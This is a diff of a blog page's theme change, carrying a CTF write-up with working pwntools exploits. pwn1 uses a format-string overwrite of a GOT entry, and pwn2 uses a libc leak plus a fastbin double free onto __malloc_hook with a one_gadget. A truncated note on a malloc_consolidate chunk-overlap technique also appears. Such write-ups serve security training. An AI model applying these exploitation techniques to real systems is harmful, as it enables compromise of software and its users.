@@ -1,107 +1,325 @@
-<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="pumpkin9"><meta name="renderer" content="webkit"><meta name="copyright" content="pumpkin9"><meta name="keywords" content="pumpkin9"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>山东深思杯write up · pumpkin9's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
-  "use strict";
-  // rel=preload support test
-  if( !w.loadCSS ){
-    w.loadCSS = function(){};
-  }
-  // define on the loadCSS obj
-  var rp = loadCSS.relpreload = {};
-  // rel=preload feature support test
-  // runs once and returns a function for compat purposes
-  rp.support = (function(){
-    var ret;
-    try {
-      ret = w.document.createElement( "link" ).relList.supports( "preload" );
-    } catch (e) {
-      ret = false;
-    }
-    return function(){
-      return ret;
-    };
-  })();
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+      <script>
+  var _hmt = _hmt || []
+  ;(function() {
+    var hm = document.createElement('script')
+    hm.src = 'https://hm.baidu.com/hm.js?5a0acc897fd96474a2c8f4deac84611a'
+    var s = document.getElementsByTagName('script')[0]
+    s.parentNode.insertBefore(hm, s)
+  })()
+</script> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content>
+    <meta name="description" content>
+    
+    <title>
+      山东深思杯write up - pumpkin9
+    </title>
+    <link rel="manifest" href="/manifest.json">
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/style/style.css">
+  </head>
+  <body>
+    
+    <div id="post-toc" class="animated hiddenToc hide">
+      <span class="title">Toc</span>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FuQiang"><span class="toc-text">FuQiang</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-text">pwn3</span></a></li></ol></li></ol>
+    </div>
+    
+    <div id="fixed-menu-wrap">
+      <span class="iconfont icon-sousuo search-box menu-reset"></span>
+      <span class="icon-toc menu-reset">Toc</span>
+      <span class="iconfont icon-arrowup menu-reset"></span>
+    </div>
+    <div id="fixed-menu">
+      <span class="iconfont icon-menu-"></span>
+    </div>
+    <div id="progress">
+      <div class="line"></div>
+    </div>
+    <div id="search-shade" class="animated hiddenSearch hide">
+      <div class="input-wrap">
+        <span class="iconfont icon-sousuo search-box"></span>
+        <input type="text" placeholder="Search">
+        <span class="iconfont icon-close"></span>
+      </div>
+      <div class="search-result">
+        <div class="meta">
+          <span><b id="result-count">0</b> results found</span>
+          <img src="/images/logo.jpeg">
+        </div>
+        <ul id="result-box"></ul>
+      </div>
+    </div>
+    <div id="menu-mask" class="animated hideMenuMask hide">
+      <span class="iconfont icon-close"></span>
+      <div class="nav">
+        
+        <a href="/" class>
+          Home
+        </a>
+        
+        <a href="/archives" class>
+          Archives
+        </a>
+        
+        <a href="/categories" class>
+          Categories
+        </a>
+        
+        <a href="/tags" class>
+          Tags
+        </a>
+        
+        <a href="/friends" class>
+          Friends
+        </a>
+        
+        <a href="/about" class>
+          About
+        </a>
+        
+      </div>
+    </div>
+    <div id="header">
+      <div class="intro">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <div class="author">pumpkin9</div>
+      </div>
+      <div class="nav">
+        <span class="iconfont icon-menu menu-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+    </div>
+    <div id="side" class="animated bounceInLeft">
+      <div class="shrink">
+        <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        <span class="iconfont icon-menu toggle-icon"></span>
+        <a href="#" class="search-box">
+          <span class="iconfont icon-sousuo"></span>
+        </a>
+      </div>
+      <div class="magnify">
+        <div class="about">
+          <div class="author">pumpkin9</div>
+          <a href="/" class="logo" style="background-image: url('/images/logo.jpeg')"></a>
+        </div>
 
-  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
-  // then change that media back to its intended value on load
-  rp.bindMediaToggle = function( link ){
-    // remember existing media attr for ultimate state, or default to 'all'
-    var finalMedia = link.media || "all";
+        <div class="nav">
+          
+          <a href="/" class>
+            Home
+          </a>
+          
+          <a href="/archives" class>
+            Archives
+          </a>
+          
+          <a href="/categories" class>
+            Categories
+          </a>
+          
+          <a href="/tags" class>
+            Tags
+          </a>
+          
+          <a href="/friends" class>
+            Friends
+          </a>
+          
+          <a href="/about" class>
+            About
+          </a>
+          
+          <a href="#" class="search-box">
+            <span class="iconfont icon-sousuo"></span>
+          </a>
+        </div>
+        <div class="bottom">
+          <div class="follow">
+            
+            <a href="https://github.com/shixiaohu2206" target="_block">
+              <span class="iconfont icon-github"></span>
+            </a>
+            
+            <a href="https://www.facebook.com/shi.xiaohu.5" target="_block">
+              <span class="iconfont icon-facebook"></span>
+            </a>
+            
+            <a href="https://www.instagram.com/shi_xiaohu/" target="_block">
+              <span class="iconfont icon-instagram"></span>
+            </a>
+             
+            <a href="/atom.xml" target="_block">
+              <span class="iconfont icon-rss"></span>
+            </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="container">
+      <div class="main animated bounceInRight delay-0.7s">
+        <article class="post-entry">
+    <div class="header">
+      
+      <div class="title">山东深思杯write up</div>
+      <div class="meta">
+        <span class="item">
+          <span class="iconfont icon-time-circle"></span>
+          <span>2019/11/03</span>
+        </span>
 
-    function enableStylesheet(){
-      link.media = finalMedia;
-    }
+        
 
-    // bind load handlers to enable media
-    if( link.addEventListener ){
-      link.addEventListener( "load", enableStylesheet );
-    } else if( link.attachEvent ){
-      link.attachEvent( "onload", enableStylesheet );
-    }
-
-    // Set rel and non-applicable media type to start an async request
-    // note: timeout allows this to happen async to let rendering continue in IE
-    setTimeout(function(){
-      link.rel = "stylesheet";
-      link.media = "only x";
-    });
-    // also enable media after 3 seconds,
-    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
-    setTimeout( enableStylesheet, 3000 );
-  };
-
-  // loop through link elements in DOM
-  rp.poly = function(){
-    // double check this to prevent external calls from running
-    if( rp.support() ){
-      return;
-    }
-    var links = w.document.getElementsByTagName( "link" );
-    for( var i = 0; i < links.length; i++ ){
-      var link = links[ i ];
-      // qualify links to those with rel=preload and as=style attrs
-      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
-        // prevent rerunning on link
-        link.setAttribute( "data-loadcss", true );
-        // bind listeners to toggle media back
-        rp.bindMediaToggle( link );
-      }
-    }
-  };
-
-  // if unsupported, run the polyfill
-  if( !rp.support() ){
-    // run once at least
-    rp.poly();
-
-    // rerun poly on an interval until onload
-    var run = w.setInterval( rp.poly, 500 );
-    if( w.addEventListener ){
-      w.addEventListener( "load", function(){
-        rp.poly();
-        w.clearInterval( run );
-      } );
-    } else if( w.attachEvent ){
-      w.attachEvent( "onload", function(){
-        rp.poly();
-        w.clearInterval( run );
-      } );
-    }
-  }
-
-
-  // commonjs
-  if( typeof exports !== "undefined" ){
-    exports.loadCSS = loadCSS;
-  }
-  else {
-    w.loadCSS = loadCSS;
-  }
-}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
-  i.fa.fa-comment
-  .saying--><div class="cxo-profile-inner"><div class="profile-name">pumpkin9</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//github.com/Longlongyu" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/archives/">你不关注花，花永远只是花</a></div><div class="intro-nav-label-box"><a href="/archives/">Home</a><a href="/about/">About</a><a href="/categories/">Category</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/archives/">Home</a><a href="/about/">About</a><a href="/categories/">Category</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">山东深思杯write up</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-11-03</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="write up"> write up</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="FuQiang"><a href="#FuQiang" class="headerlink" title="FuQiang"></a>FuQiang</h2><p>程序</p>
-<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>题目给了一个backdoor ，满足约束条件即可</p>
+         
+        <span class="item">
+          <span class="iconfont icon-folder"></span>
+          <span>
+              
+                
+                  <a href="/categories/CTF">CTF</a>
+                
+              
+          </span>
+        </span>
+        
+        
+         
+          <span class="item">
+            <span class="iconfont icon-tag1"></span>
+            <span>
+                
+                  
+                    <a href="/tags/write up">write up</a>
+                  
+                
+            </span>
+          </span>
+         
+      </div>
+      <div>
+      </div>
+    </div>
+    <h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="FuQiang">FuQiang<a class="post-anchor" href="#FuQiang"></a></h2><p>程序</p>
+<h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="pwn1">pwn1<a class="post-anchor" href="#pwn1"></a></h2><p>题目给了一个backdoor ，满足约束条件即可</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">"./pwn_MinZhu"</span>)</span><br><span class="line"><span class="comment">#p =remote("172.29.1.38", 9999)</span></span><br><span class="line">elf = ELF(<span class="string">"./pwn_MinZhu"</span>)</span><br><span class="line">system = <span class="number">0x08048696</span></span><br><span class="line">plt = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">p.sendlineafter(<span class="string">"Key:"</span>,<span class="string">"xNd9y6"</span>)</span><br><span class="line">offset = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"your msg:"</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804A064</span>:<span class="number">0x3</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;<span class="number">0x804A060</span>:<span class="number">8217</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;plt:<span class="number">0x8048696</span>&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SHBYTE = 57 9</span></span><br><span class="line"><span class="string">SHBYTE1 = 78 N</span></span><br><span class="line"><span class="string">SHBYTE2 = 100 d</span></span><br><span class="line"><span class="string">CHAR S = 120 x</span></span><br><span class="line"><span class="string">v4 =6</span></span><br><span class="line"><span class="string">v3 = y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xNd9y6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">"-h"</span>]</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"\nInput the length of data:"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Leave your message:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter what you want to modify:\n"</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">""</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">""</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">"aaaaaaa"</span>) <span class="comment">#3</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Sticky note:aaaaaaa\n"</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">"libc_base : 0x%x"</span>%libc_base)</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">"malloc_hook:0x%x"</span>%malloc_hook)</span><br><span class="line">log.success(<span class="string">"one_gadget:0x%x"</span>%(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"\nInput the length of data:"</span>,str(<span class="number">127</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="pwn2">pwn2<a class="post-anchor" href="#pwn2"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">"-h"</span>]</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"\nInput the length of data:"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Leave your message:\n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter what you want to modify:\n"</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">""</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">""</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x7f</span>,<span class="string">"aaaaaaa"</span>) <span class="comment">#3</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">"Sticky note:aaaaaaa\n"</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">log.success(<span class="string">"libc_base : 0x%x"</span>%libc_base)</span><br><span class="line">malloc_hook = libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(<span class="string">"malloc_hook:0x%x"</span>%malloc_hook)</span><br><span class="line">log.success(<span class="string">"one_gadget:0x%x"</span>%(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x68</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">""</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">19</span>+p64(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice:"</span>,str(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"\nInput the length of data:"</span>,str(<span class="number">127</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>利用 malloc_consolidate 去完成 chunk 的重叠，从而实现leak libc跟 tcache 的uaf（通过刻意的让 unsorted chunk 的size变小，可以让 unsorted chunk 的下一个chunk的prev_size 不变，从而可以 pass malloc_consolidate 时的 unlink 检测，从而实现chunk的重</p>
-</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://pumpkin9.github.io">pumpkin9</a></p><p> <span>Link:  </span><a href="http://pumpkin9.github.io/2019/11/03/山东深思杯write-up/">http://pumpkin9.github.io/2019/11/03/山东深思杯write-up/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2019/11/29/i春秋-第三季CTF答题赛write-up/" title="i春秋-第三季CTF答题赛write up"><span>< PreviousPost</span><br><span class="prevTitle">i春秋-第三季CTF答题赛write up</span></a><a class="nextSlogan" href="/2019/10/21/chunk-extend/" title="chunk extend"><span>NextPost ></span><br><span class="nextTitle">chunk extend</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">1.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#FuQiang"><span class="toc-number">1.1.</span> <span class="toc-text">FuQiang</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">2.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">2.1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">2.2.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-number">2.3.</span> <span class="toc-text">pwn3</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
+<h2 id="pwn3">pwn3<a class="post-anchor" href="#pwn3"></a></h2><p>利用 malloc_consolidate 去完成 chunk 的重叠，从而实现leak libc跟 tcache 的uaf（通过刻意的让 unsorted chunk 的size变小，可以让 unsorted chunk 的下一个chunk的prev_size 不变，从而可以 pass malloc_consolidate 时的 unlink 检测，从而实现chunk的重</p>
+
+
+  
+    <div class="post-reward">
+    <div id="reward-button">打赏</div>
+      <div id="qr">
+        <div class="wrap">
+            
+            <div class="bg-wrap">
+              <a href="/images/zhifubao.png" target="_block" class="bg" style="background-image:url('/images/zhifubao.png')"></a>
+              支付宝
+            </div>
+            
+            
+            <div class="bg-wrap">
+                <a href="/images/weixin.png" target="_block" class="bg" style="background-image:url('/images/weixin.png')"></a>
+              微信
+            </div>
+            
+        </div>
+      </div>
+    </div>
+  
+  <div class="post-guide">
+    <div class="item left">
+        
+          <a href="/2019/11/29/i春秋-第三季CTF答题赛write-up/">i春秋-第三季CTF答题赛write up</a>
+        
+    </div>
+    <div class="item right">
+        
+          <a href="/2019/10/21/chunk-extend/">chunk extend</a>
+        
+    </div>
+  </div>
+
+  
+
+  <div class="post-copyright">
+    <div class="auth">
+      本文作者：<a href="http://pumpkin9.github.io">pumpkin9</a>
+    </div>
+    <div class="link">
+      永久链接：<a href="http://pumpkin9.github.io/2019/11/03/山东深思杯write-up/">http://pumpkin9.github.io/2019/11/03/山东深思杯write-up/</a>
+    </div>
+    <div class="declare">
+      版权声明：本文首发于<a href="http://pumpkin9.github.io">pumpkin9</a>的博客，转载请注明出处！
+    </div>
+  </div>
+
+  <div id="comment"></div>
+
+  
+  
+</article>
+        <footer>
+          <div class="copyright">
+            ©2019
+            <a href="http://pumpkin9.github.io">pumpkin9</a> Powered by <a href="https://hexo.io">Hexo</a> |
+            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu">hexo-theme-huhu</a>
+          </div>
+          
+        </footer>
+      </div>
+    </div>
+  </body>
+  
+</html>
+<script type="text/javascript">
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    
+    window.loadJs = function(d, m, a) {
+      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
+      var b = document.createElement('script')
+      b.defer = true
+      b.setAttribute('type', 'text/javascript')
+      b.setAttribute('charset', 'UTF-8')
+      b.setAttribute('async', 'true')
+      b.setAttribute('src', d)
+      m && b.setAttribute('data-main', '/scripts/app-built')
+      if (typeof a === 'function') {
+        if (window.attachEvent) {
+          b.onreadystatechange = function() {
+            var e = b.readyState
+            if (e === 'loaded' || e === 'complete') {
+              b.onreadystatechange = null
+              a()
+            }
+          }
+        } else {
+          b.onload = a
+        }
+      }
+      c.appendChild(b)
+    }
